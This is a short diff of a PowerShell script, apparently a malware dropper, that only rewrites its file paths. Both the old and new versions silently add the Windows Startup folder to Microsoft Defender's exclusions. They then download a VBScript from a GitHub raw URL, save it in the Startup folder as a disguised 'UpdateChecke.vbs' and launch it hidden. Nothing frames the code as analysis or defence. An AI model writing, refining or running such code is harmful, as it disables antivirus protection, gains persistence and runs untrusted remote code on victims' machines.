@@ -1,4 +1,5 @@
-powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+$location = '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup'
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath $location"
 $url = 'https://raw.githubusercontent.com/AmjadBalls/TEST/refs/heads/main/Discord.vbs'
-Invoke-WebRequest -Uri $url -OutFile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateChecke.vbs" 
-Start-Process -FilePath "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateChecke.vbs" -WindowStyle Hidden
+Invoke-WebRequest -Uri $url -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\UpdateChecke.vbs" 
+Start-Process -FilePath "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\UpdateChecke.vbs" -WindowStyle Hidden
